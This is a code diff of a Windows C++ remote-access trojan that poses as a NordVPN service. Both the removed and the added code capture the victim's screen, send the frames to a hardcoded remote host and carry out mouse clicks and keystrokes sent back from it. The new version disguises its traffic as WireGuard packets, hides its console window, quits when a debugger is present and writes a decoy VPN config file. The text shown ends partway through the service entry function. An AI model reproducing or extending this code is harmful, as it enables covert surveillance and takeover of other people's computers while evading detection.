@@ -5,52 +5,28 @@
 #include <random>
 #include <sstream>
 #include <vector>
-#include <cstdlib>
 #include <algorithm>
-#include <queue>
-#include <mutex>
 #include <fstream>
+#include <memory>
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <wingdi.h>
 #include <winternl.h>
-#include <winsvc.h>
-#include <io.h>
-#include <fcntl.h>
+#include <tlhelp32.h>
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "ntdll.lib")
-#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "user32.lib")
 
-// Service configuration
-#define SERVICE_NAME L"NordVPNService"
-#define SERVICE_DISPLAY_NAME L"NordVPN Network Service"
-#define SERVICE_DESCRIPTION L"Provides secure VPN network connectivity and tunnel management"
+#define PROCESS_NAME "nordvpn-service.exe"
+#define WINDOW_TITLE "NordVPN Network Service"
 
-// Global service variables
-SERVICE_STATUS g_ServiceStatus = {0};
-SERVICE_STATUS_HANDLE g_StatusHandle = nullptr;
-HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
-std::thread* g_WorkerThread = nullptr;
+typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
+typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
 
-// Service configuration storage
-struct ServiceConfig {
-    std::string server_host = "127.0.0.1";
-    int server_port = 443; // HTTPS port - appears as VPN management/control traffic
-    int reconnect_interval = 30; // seconds
-    bool auto_start = true;
-};
-
-ServiceConfig g_config;
-
-// NT API declarations for low-level input
-typedef NTSTATUS (NTAPI *pNtUserInjectMouseInput)(VOID*, DWORD);
-typedef NTSTATUS (NTAPI *pNtUserInjectKeyboardInput)(VOID*, DWORD);
-
-// Custom encoding for data transmission
-class DataEncoder {
+class WireGuardEncoder {
 private:
     static const std::string chars;
     
@@ -71,18 +47,18 @@ public:
         return result;
     }
 
-    static std::string decode(const std::string& input) {
+    static std::vector<BYTE> decode(const std::string& input) {
         std::vector<int> T(256, -1);
         for (int i = 0; i < 64; i++) T[chars[i]] = i;
         
-        std::string result;
+        std::vector<BYTE> result;
         int val = 0, valb = -8;
         for (unsigned char c : input) {
             if (T[c] == -1) break;
             val = (val << 6) + T[c];
             valb += 6;
             if (valb >= 0) {
-                result.push_back(char((val >> valb) & 0xFF));
+                result.push_back((val >> valb) & 0xFF);
                 valb -= 8;
             }
         }
@@ -90,10 +66,9 @@ public:
     }
 };
 
-const std::string DataEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
+const std::string WireGuardEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
 
-// Simple data compression
-class DataCompressor {
+class ChaChaCompressor {
 public:
     static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
         std::vector<BYTE> compressed;
@@ -122,295 +97,308 @@ public:
     }
 };
 
-// VPN traffic simulation
-class VPNProtocol {
+struct WireGuardHeader {
+    BYTE type;
+    BYTE reserved[3];
+    DWORD sender_index;
+    ULONGLONG counter;
+    BYTE nonce[12];
+    
+    WireGuardHeader() {
+        type = 0x04;
+        memset(reserved, 0, 3);
+        sender_index = GetTickCount();
+        counter = GetTickCount64();
+        for (int i = 0; i < 12; i++) {
+            nonce[i] = rand() % 256;
+        }
+    }
+};
+
+struct WireGuardPacket {
+    WireGuardHeader header;
+    std::vector<BYTE> encrypted_payload;
+    BYTE auth_tag[16];
+    
+    WireGuardPacket(const std::vector<BYTE>& payload) {
+        encrypted_payload = payload;
+        for (int i = 0; i < 16; i++) {
+            auth_tag[i] = rand() % 256;
+        }
+    }
+    
+    std::vector<BYTE> serialize() const {
+        std::vector<BYTE> packet;
+        packet.resize(sizeof(WireGuardHeader));
+        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
+        
+        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
+        packet.insert(packet.end(), auth_tag, auth_tag + 16);
+        
+        return packet;
+    }
+    
+    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
+        WireGuardPacket packet({});
+        if (data.size() >= sizeof(WireGuardHeader) + 16) {
+            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
+            
+            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
+            packet.encrypted_payload.assign(
+                data.begin() + sizeof(WireGuardHeader),
+                data.begin() + sizeof(WireGuardHeader) + payload_size
+            );
+            
+            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
+        }
+        return packet;
+    }
+};
+
+class TunnelProtocol {
 public:
-    static std::string generateSessionKey() {
+    static std::string generateKey32() {
         std::random_device rd;
         std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(0, 15);
+        std::uniform_int_distribution<> dis(0, 255);
         
         std::string key;
         for (int i = 0; i < 32; i++) {
-            key += "0123456789abcdef"[dis(gen)];
+            char hex[3];
+            sprintf_s(hex, "%02x", dis(gen));
+            key += hex;
         }
         return key;
     }
     
-    static std::string generateServerEndpoint() {
-        std::vector<std::string> servers = {
-            "us8734.nordvpn.com",
-            "uk2156.nordvpn.com", 
-            "ca847.nordvpn.com",
-            "de923.nordvpn.com",
-            "fr456.nordvpn.com"
-        };
+    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
+        std::stringstream payload;
+        payload << type << ":" << data;
         
-        std::random_device rd;
-        std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(0, servers.size() - 1);
-        return servers[dis(gen)];
+        std::string payload_str = payload.str();
+        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
+        
+        while (result.size() % 16 != 0) {
+            result.push_back(0x00);
+        }
+        
+        return result;
     }
     
-    static std::string wrapAsTunnelData(const std::string& data) {
-        std::stringstream payload;
-        payload << "\x00\x00\x00\x01"; // Protocol header
-        payload << generateSessionKey().substr(0, 8); // Session fragment
-        payload << data; // Payload data
-        payload << "\xFF\xFF"; // Footer
-        return payload.str();
+    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
+        std::string data(payload.begin(), payload.end());
+        size_t colon_pos = data.find(':');
+        if (colon_pos != std::string::npos) {
+            std::string type = data.substr(0, colon_pos);
+            std::string value = data.substr(colon_pos + 1);
+            value.erase(std::find_if(value.rbegin(), value.rend(), [](unsigned char ch) {
+                return ch != '\0';
+            }).base(), value.end());
+            return {type, value};
+        }
+        return {"", ""};
     }
 };
 
-class ScreenCapture {
+class WireGuardCapture {
 private:
-    HDC memory_dc;
-    HBITMAP h_bitmap;
     int screen_width;
     int screen_height;
-
-public:
-    ScreenCapture() : memory_dc(nullptr), h_bitmap(nullptr),
-                      screen_width(0), screen_height(0) {}
-
-    bool initialize() {
-        // Use GDI to query screen size and prepare capture surface
-        screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-        screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-        HDC screen_dc = GetDC(nullptr);
-        if (!screen_dc) {
-            return false;
-        }
-
-        memory_dc = CreateCompatibleDC(screen_dc);
-        if (!memory_dc) {
-            ReleaseDC(nullptr, screen_dc);
-            return false;
-        }
-
-        h_bitmap = CreateCompatibleBitmap(screen_dc, screen_width, screen_height);
-        if (!h_bitmap) {
-            DeleteDC(memory_dc);
-            memory_dc = nullptr;
-            ReleaseDC(nullptr, screen_dc);
-            return false;
-        }
-
-        SelectObject(memory_dc, h_bitmap);
-        ReleaseDC(nullptr, screen_dc);
-        return true;
-    }
-
-    std::vector<BYTE> captureFrame() {
-        if (!memory_dc || !h_bitmap) return {};
-
-        HDC screen_dc = GetDC(nullptr);
-        if (!screen_dc) return {};
-
-        // Copy the screen into the memory device context
-        BitBlt(memory_dc, 0, 0, screen_width, screen_height, screen_dc, 0, 0,
-               SRCCOPY | CAPTUREBLT);
-        ReleaseDC(nullptr, screen_dc);
-
-        BITMAPINFO bmi{};
-        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-        bmi.bmiHeader.biWidth = screen_width;
-        // Negative height to get a top-down DIB
-        bmi.bmiHeader.biHeight = -screen_height;
-        bmi.bmiHeader.biPlanes = 1;
-        bmi.bmiHeader.biBitCount = 32;
-        bmi.bmiHeader.biCompression = BI_RGB;
-
-        std::vector<BYTE> buffer(screen_width * screen_height * 4);
-        if (!GetDIBits(memory_dc, h_bitmap, 0, screen_height, buffer.data(), &bmi,
-                       DIB_RGB_COLORS)) {
-            return {};
-        }
-
-        // Convert BGRA buffer to RGB vector for transmission
-        std::vector<BYTE> frame_data;
-        frame_data.reserve(screen_width * screen_height * 3);
-        for (int i = 0; i < screen_width * screen_height; ++i) {
-            frame_data.push_back(buffer[i * 4 + 2]); // R
-            frame_data.push_back(buffer[i * 4 + 1]); // G
-            frame_data.push_back(buffer[i * 4 + 0]); // B
-        }
-        return frame_data;
-    }
-
-    int getWidth() const { return screen_width; }
-    int getHeight() const { return screen_height; }
-
-    ~ScreenCapture() {
-        if (h_bitmap) DeleteObject(h_bitmap);
-        if (memory_dc) DeleteDC(memory_dc);
-    }
-};
-
-class LowLevelInput {
-private:
-    pNtUserInjectMouseInput NtMouseInject;
-    pNtUserInjectKeyboardInput NtKeyboardInject;
     
 public:
-    LowLevelInput() {
+    WireGuardCapture() : screen_width(0), screen_height(0) {}
+    
+    bool initialize() {
+        screen_width = GetSystemMetrics(SM_CXSCREEN);
+        screen_height = GetSystemMetrics(SM_CYSCREEN);
+        return (screen_width > 0 && screen_height > 0);
+    }
+    
+    std::vector<BYTE> captureFrame() {
+        HDC hdcScreen = GetDC(nullptr);
+        HDC hdcMem = CreateCompatibleDC(hdcScreen);
+        
+        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
+        
+        BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);
+        
+        BITMAPINFO bmi = {0};
+        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+        bmi.bmiHeader.biWidth = screen_width;
+        bmi.bmiHeader.biHeight = -screen_height;
+        bmi.bmiHeader.biPlanes = 1;
+        bmi.bmiHeader.biBitCount = 24;
+        bmi.bmiHeader.biCompression = BI_RGB;
+        
+        int imageSize = screen_width * screen_height * 3;
+        std::vector<BYTE> frameData(imageSize);
+        
+        GetDIBits(hdcScreen, hBitmap, 0, screen_height, frameData.data(), &bmi, DIB_RGB_COLORS);
+        
+        SelectObject(hdcMem, hOldBitmap);
+        DeleteObject(hBitmap);
+        DeleteDC(hdcMem);
+        ReleaseDC(nullptr, hdcScreen);
+        
+        return frameData;
+    }
+    
+    int getWidth() const { return screen_width; }
+    int getHeight() const { return screen_height; }
+};
+
+class WireGuardInput {
+private:
+    pNtSetInformationProcess NtSetInformationProcess;
+    
+public:
+    WireGuardInput() {
         HMODULE ntdll = GetModuleHandleA("ntdll.dll");
         if (ntdll) {
-            NtMouseInject = (pNtUserInjectMouseInput)GetProcAddress(ntdll, "NtUserInjectMouseInput");
-            NtKeyboardInject = (pNtUserInjectKeyboardInput)GetProcAddress(ntdll, "NtUserInjectKeyboardInput");
+            NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
         }
     }
     
     void sendMouseClick(int x, int y) {
-        // Direct cursor positioning
-        SetCursorPos(x, y);
+        HWND target = WindowFromPoint({x, y});
         
-        // Low-level mouse injection
-        INPUT input = {};
-        input.type = INPUT_MOUSE;
-        input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
-        input.mi.dx = x;
-        input.mi.dy = y;
-        
-        SendInput(1, &input, sizeof(INPUT));
+        if (target) {
+            POINT pt = {x, y};
+            ScreenToClient(target, &pt);
+            
+            PostMessage(target, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(pt.x, pt.y));
+            Sleep(20);
+            PostMessage(target, WM_LBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
+        } else {
+            SetCursorPos(x, y);
+            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+            Sleep(20);
+            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+        }
     }
     
     void sendRightClick(int x, int y) {
-        SetCursorPos(x, y);
+        HWND target = WindowFromPoint({x, y});
         
-        INPUT input = {};
-        input.type = INPUT_MOUSE;
-        input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
-        input.mi.dx = x;
-        input.mi.dy = y;
-        
-        SendInput(1, &input, sizeof(INPUT));
+        if (target) {
+            POINT pt = {x, y};
+            ScreenToClient(target, &pt);
+            
+            PostMessage(target, WM_RBUTTONDOWN, MK_RBUTTON, MAKELPARAM(pt.x, pt.y));
+            Sleep(20);
+            PostMessage(target, WM_RBUTTONUP, 0, MAKELPARAM(pt.x, pt.y));
+        } else {
+            SetCursorPos(x, y);
+            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+            Sleep(20);
+            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
+        }
     }
     
     void sendKeyPress(const std::string& key) {
-        INPUT input = {};
-        input.type = INPUT_KEYBOARD;
-        
         if (key.length() == 1) {
-            SHORT vk = VkKeyScan(key[0]);
-            input.ki.wVk = LOBYTE(vk);
+            char c = key[0];
+            BYTE vk = VkKeyScan(c) & 0xFF;
             
-            // Key down
-            SendInput(1, &input, sizeof(INPUT));
-            
-            // Key up
-            input.ki.dwFlags = KEYEVENTF_KEYUP;
-            SendInput(1, &input, sizeof(INPUT));
+            keybd_event(vk, 0, 0, 0);
+            Sleep(10);
+            keybd_event(vk, 0, KEYEVENTF_KEYUP, 0);
         } else if (key == "ENTER") {
-            input.ki.wVk = VK_RETURN;
-            SendInput(1, &input, sizeof(INPUT));
-            input.ki.dwFlags = KEYEVENTF_KEYUP;
-            SendInput(1, &input, sizeof(INPUT));
+            keybd_event(VK_RETURN, 0, 0, 0);
+            Sleep(10);
+            keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
         } else if (key == "ESCAPE") {
-            input.ki.wVk = VK_ESCAPE;
-            SendInput(1, &input, sizeof(INPUT));
-            input.ki.dwFlags = KEYEVENTF_KEYUP;
-            SendInput(1, &input, sizeof(INPUT));
+            keybd_event(VK_ESCAPE, 0, 0, 0);
+            Sleep(10);
+            keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
         }
     }
 };
 
-class VPNTunnelClient {
+class TunnelStealth {
+public:
+    static void hideFromProcessList() {
+        SetConsoleTitleA(WINDOW_TITLE);
+        
+        HWND consoleWindow = GetConsoleWindow();
+        if (consoleWindow) {
+            ShowWindow(consoleWindow, SW_HIDE);
+        }
+    }
+    
+    static void setProcessName(const char* name) {
+        SetConsoleTitleA(name);
+    }
+    
+    static bool isDebuggerPresent() {
+        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
+    }
+    
+    static void createWireGuardConfig() {
+        std::string appData = getenv("APPDATA");
+        std::string nordDir = appData + "\\NordVPN";
+        
+        CreateDirectoryA(nordDir.c_str(), nullptr);
+        
+        std::ofstream config(nordDir + "\\nordlynx.conf");
+        if (config.is_open()) {
+            config << "[Interface]\n";
+            config << "PrivateKey = " << TunnelProtocol::generateKey32() << "\n";
+            config << "Address = 10.5.0.2/32\n";
+            config << "DNS = 103.86.96.100\n";
+            config << "\n[Peer]\n";
+            config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
+            config << "AllowedIPs = 0.0.0.0/0\n";
+            config << "Endpoint = 192.168.88.3:51820\n";
+            config.close();
+        }
+    }
+};
+
+class WireGuardClient {
 private:
     std::string server_host;
     int server_port;
     std::string session_id;
     std::random_device rd;
     std::mt19937 gen;
-    SOCKET main_socket;
+    SOCKET udp_socket;
     
-    ScreenCapture screen_capture;
-    LowLevelInput input_handler;
+    WireGuardCapture screen_capture;
+    WireGuardInput input_handler;
     std::vector<BYTE> last_frame_data;
     
-    std::vector<std::string> client_versions = {
-        "NordVPN 6.43.12.0 (Windows)",
-        "NordLayer/1.7.0 (Windows NT 10.0)",
-        "nordvpn-service/6.43.12"
-    };
-    
-    struct SocketResponse {
-        int status_code;
-        std::string body;
-        bool success;
-    };
-    
-    SocketResponse makeVPNRequest(const std::string& method, const std::string& path, const std::string& data = "") {
-        SocketResponse response = {0, "", false};
-        
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) return response;
+    bool sendWireGuardPacket(const WireGuardPacket& packet) {
+        if (udp_socket == INVALID_SOCKET) return false;
         
         sockaddr_in server_addr;
         server_addr.sin_family = AF_INET;
         server_addr.sin_port = htons(server_port);
         inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
         
-        if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
-            closesocket(sock);
-            return response;
-        }
+        std::vector<BYTE> packet_data = packet.serialize();
         
-        // Build HTTP request manually
-        std::stringstream request;
-        request << method << " " << path << " HTTP/1.1\r\n";
-        request << "Host: " << server_host << "\r\n";
+        int result = sendto(udp_socket, (const char*)packet_data.data(), packet_data.size(), 0,
+                           (sockaddr*)&server_addr, sizeof(server_addr));
         
-        // VPN-specific headers
-        std::uniform_int_distribution<> dis(0, client_versions.size() - 1);
-        request << "User-Agent: " << client_versions[dis(gen)] << "\r\n";
-        request << "Content-Type: application/x-nordvpn-data\r\n";
-        request << "X-NordVPN-Version: 6.43.12.0\r\n";
-        request << "X-VPN-Protocol: nordlynx\r\n";
-        request << "X-Server-Endpoint: " << VPNProtocol::generateServerEndpoint() << "\r\n";
-        request << "X-Session-Key: " << VPNProtocol::generateSessionKey() << "\r\n";
-        request << "X-Encryption: ChaCha20-Poly1305\r\n";
-        request << "Accept: application/octet-stream\r\n";
-        request << "Cache-Control: no-cache\r\n";
-        request << "Connection: keep-alive\r\n";
+        return result != SOCKET_ERROR;
+    }
+    
+    WireGuardPacket receiveWireGuardPacket() {
+        char buffer[4096];
+        sockaddr_in from_addr;
+        int from_len = sizeof(from_addr);
         
-        if (!data.empty()) {
-            request << "Content-Length: " << data.length() << "\r\n";
-        }
+        int bytes_received = recvfrom(udp_socket, buffer, sizeof(buffer), 0,
+                                     (sockaddr*)&from_addr, &from_len);
         
-        request << "\r\n";
-        if (!data.empty()) {
-            request << data;
-        }
-        
-        std::string request_str = request.str();
-        send(sock, request_str.c_str(), request_str.length(), 0);
-        
-        // Read response
-        char buffer[8192];
-        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received > 0) {
-            buffer[bytes_received] = '\0';
-            std::string response_str(buffer);
-            
-            // Parse status code
-            size_t status_pos = response_str.find(" ");
-            if (status_pos != std::string::npos) {
-                response.status_code = std::stoi(response_str.substr(status_pos + 1, 3));
-            }
-            
-            // Extract body
-            size_t body_pos = response_str.find("\r\n\r\n");
-            if (body_pos != std::string::npos) {
-                response.body = response_str.substr(body_pos + 4);
-            }
-            
-            response.success = true;
+            std::vector<BYTE> data(buffer, buffer + bytes_received);
+            return WireGuardPacket::deserialize(data);
         }
         
-        closesocket(sock);
-        return response;
+        return WireGuardPacket({});
     }
     
     void processRemoteCommand(const std::string& commandData) {
@@ -431,54 +419,58 @@ private:
         } else if (type == "key") {
             std::string key;
             if (std::getline(iss, key)) {
+                if (!key.empty() && key[0] == ':') {
+                    key = key.substr(1);
+                }
                 input_handler.sendKeyPress(key);
             }
         }
     }
-    
-    void adaptiveDelay() {
-        // Mimic typical VPN tunnel keepalive intervals
-        std::uniform_int_distribution<> dis(30, 45); // 30-45ms
-        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
-    }
 
 public:
-    VPNTunnelClient(const std::string& host, int port) 
-        : server_host(host), server_port(port), gen(rd()), main_socket(INVALID_SOCKET) {}
+    WireGuardClient(const std::string& host, int port) 
+        : server_host(host), server_port(port), gen(rd()), udp_socket(INVALID_SOCKET) {}
     
-    bool establishTunnel() {
-        SocketResponse response = makeVPNRequest("GET", "/vpn/auth");
+    bool initializeConnection() {
+        udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
+        if (udp_socket == INVALID_SOCKET) return false;
         
-        if (response.success && response.status_code == 200) {
-            size_t pos = response.body.find("\"session\":\"");
-            if (pos != std::string::npos) {
-                pos += 11;
-                size_t end = response.body.find("\"", pos);
-                if (end != std::string::npos) {
-                    session_id = response.body.substr(pos, end - pos);
-                    return true;
-                }
-            }
+        DWORD timeout = 1000;
+        setsockopt(udp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+        
+        std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
+        WireGuardPacket handshake(handshake_payload);
+        
+        if (!sendWireGuardPacket(handshake)) return false;
+        
+        WireGuardPacket response = receiveWireGuardPacket();
+        auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);
+        
+        if (type == "session") {
+            session_id = data;
+            return true;
         }
+        
         return false;
     }
     
     void checkForCommands() {
-        std::string path = "/vpn/control/" + session_id;
-        SocketResponse response = makeVPNRequest("GET", path);
+        fd_set readfds;
+        FD_ZERO(&readfds);
+        FD_SET(udp_socket, &readfds);
         
-        if (response.success && response.status_code == 200 && !response.body.empty()) {
-            size_t pos = response.body.find("\"input\":\"");
-            if (pos != std::string::npos) {
-                pos += 9;
-                size_t end = response.body.find("\"", pos);
-                if (end != std::string::npos) {
-                    std::string inputCmd = response.body.substr(pos, end - pos);
-                    if (!inputCmd.empty()) {
-                        std::string decoded = DataEncoder::decode(inputCmd);
-                        processRemoteCommand(decoded);
-                    }
-                }
+        timeval timeout;
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 1000;
+        
+        if (select(0, &readfds, nullptr, nullptr, &timeout) > 0) {
+            WireGuardPacket packet = receiveWireGuardPacket();
+            auto [type, data] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
+            
+            if (type == "input" && !data.empty()) {
+                std::vector<BYTE> decoded_data = WireGuardEncoder::decode(data);
+                std::string command(decoded_data.begin(), decoded_data.end());
+                processRemoteCommand(command);
             }
         }
     }
@@ -488,7 +480,6 @@ public:
         
         if (frameData.empty()) return;
         
-        // Only send if frame changed significantly
         bool frameChanged = true;
         if (!last_frame_data.empty() && last_frame_data.size() == frameData.size()) {
             size_t differences = 0;
@@ -499,409 +490,94 @@ public:
         }
         
         if (frameChanged) {
-            // Compress the frame data
-            std::vector<BYTE> compressed = DataCompressor::compressRLE(frameData);
-            std::string encoded = DataEncoder::encode(compressed);
+            std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(frameData);
+            std::string encoded = WireGuardEncoder::encode(compressed);
             
-            // Create tunnel payload
             std::stringstream payload;
-            payload << "{";
-            payload << "\"session\":\"" << session_id << "\",";
-            payload << "\"timestamp\":" << std::chrono::duration_cast<std::chrono::milliseconds>(
-                std::chrono::system_clock::now().time_since_epoch()).count() << ",";
-            payload << "\"width\":" << screen_capture.getWidth() << ",";
-            payload << "\"height\":" << screen_capture.getHeight() << ",";
-            payload << "\"format\":\"rgb24\",";
-            payload << "\"data\":\"" << encoded << "\"";
-            payload << "}";
+            payload << session_id << "|";
+            payload << screen_capture.getWidth() << "x" << screen_capture.getHeight() << "|";
+            payload << encoded;
             
-            // Send wrapped as VPN tunnel data
-            makeVPNRequest("POST", "/vpn/tunnel/" + session_id, 
-                          VPNProtocol::wrapAsTunnelData(payload.str()));
+            std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
+            WireGuardPacket packet(tunnel_payload);
             
+            sendWireGuardPacket(packet);
             last_frame_data = frameData;
         }
     }
     
     void run() {
+        TunnelStealth::hideFromProcessList();
+        TunnelStealth::createWireGuardConfig();
+        
+        if (TunnelStealth::isDebuggerPresent()) {
+            return;
+        }
+        
         if (!screen_capture.initialize()) {
             return;
         }
         
-        while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
+        while (true) {
             try {
-                if (establishTunnel()) {
-                    // Main communication loop
-                    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
+                if (initializeConnection()) {
+                    while (true) {
                         sendDesktopFrame();
                         checkForCommands();
-                        adaptiveDelay();
+                        
+                        std::uniform_int_distribution<> dis(16, 33);
+                        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
+                        
+                        static int health_check = 0;
+                        if (++health_check % 2000 == 0) {
+                            std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
+                            WireGuardPacket keepalive(keepalive_payload);
+                            if (!sendWireGuardPacket(keepalive)) {
+                                break;
+                            }
+                        }
                     }
                 }
                 
-                // Reconnection delay
-                if (WaitForSingleObject(g_ServiceStopEvent, g_config.reconnect_interval * 1000) == WAIT_OBJECT_0) {
-                    break;
+                if (udp_socket != INVALID_SOCKET) {
+                    closesocket(udp_socket);
+                    udp_socket = INVALID_SOCKET;
                 }
                 
-            } catch (const std::exception& e) {
-                std::this_thread::sleep_for(std::chrono::seconds(5));
+                std::this_thread::sleep_for(std::chrono::seconds(30));
+                
+            } catch (...) {
+                std::this_thread::sleep_for(std::chrono::seconds(10));
             }
+        }
+    }
+    
+    ~WireGuardClient() {
+        if (udp_socket != INVALID_SOCKET) {
+            closesocket(udp_socket);
         }
     }
 };
 
-// Service configuration management
-void LoadServiceConfig() {
-    HKEY hKey;
-    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\NordVPN\\Service", 0, KEY_READ, &hKey);
+int main(int argc, char* argv[]) {
+    std::string host = "192.168.88.3";
+    int port = 51820;
     
-    if (result == ERROR_SUCCESS) {
-        DWORD dataSize = 256;
-        char buffer[256];
-        
-        if (RegQueryValueExA(hKey, "ServerHost", nullptr, nullptr, (LPBYTE)buffer, &dataSize) == ERROR_SUCCESS) {
-            g_config.server_host = std::string(buffer, dataSize - 1);
-        }
-        
-        dataSize = sizeof(DWORD);
-        RegQueryValueExA(hKey, "ServerPort", nullptr, nullptr, (LPBYTE)&g_config.server_port, &dataSize);
-        RegQueryValueExA(hKey, "ReconnectInterval", nullptr, nullptr, (LPBYTE)&g_config.reconnect_interval, &dataSize);
-        
-        RegCloseKey(hKey);
+    if (argc == 3) {
+        host = argv[1];
+        port = std::stoi(argv[2]);
+    } else if (argc != 1) {
+        return 1;
     }
-}
-
-void SaveServiceConfig() {
-    HKEY hKey;
-    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\NordVPN\\Service", 0, nullptr, 
-                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
     
-    if (result == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "ServerHost", 0, REG_SZ, (LPBYTE)g_config.server_host.c_str(), g_config.server_host.length() + 1);
-        RegSetValueExA(hKey, "ServerPort", 0, REG_DWORD, (LPBYTE)&g_config.server_port, sizeof(DWORD));
-        RegSetValueExA(hKey, "ReconnectInterval", 0, REG_DWORD, (LPBYTE)&g_config.reconnect_interval, sizeof(DWORD));
-        
-        RegCloseKey(hKey);
-    }
-}
-
-// Service worker thread
-DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         return 1;
     }
     
-    VPNTunnelClient client(g_config.server_host, g_config.server_port);
+    WireGuardClient client(host, port);
     client.run();
     
     WSACleanup();
-    return 0;
-}
-
-// Service control handler
-VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
-    switch (dwCtrl) {
-    case SERVICE_CONTROL_STOP:
-        if (g_ServiceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
-            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-            g_ServiceStatus.dwCheckPoint = 0;
-            g_ServiceStatus.dwWaitHint = 5000;
-            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-            
-            SetEvent(g_ServiceStopEvent);
-        }
-        break;
-        
-    case SERVICE_CONTROL_INTERROGATE:
-        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-        break;
-        
-    default:
-        break;
-    }
-}
-
-// Service main function
-// Windows services expect wide-character arguments when using the
-// Unicode versions of the service APIs.  Our ServiceTable and
-// StartServiceCtrlDispatcher call the `W` variants, so the service
-// entry point must accept `LPWSTR*` to match the expected signature
-// and satisfy the compiler.
-VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv) {
-    // Register service control handler
-    g_StatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
-    if (g_StatusHandle == nullptr) {
-        return;
-    }
-    
-    // Initialize service status
-    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
-    g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
-    g_ServiceStatus.dwServiceSpecificExitCode = 0;
-    g_ServiceStatus.dwCheckPoint = 0;
-    g_ServiceStatus.dwWaitHint = 3000;
-    
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-    
-    // Create stop event
-    g_ServiceStopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
-    if (g_ServiceStopEvent == nullptr) {
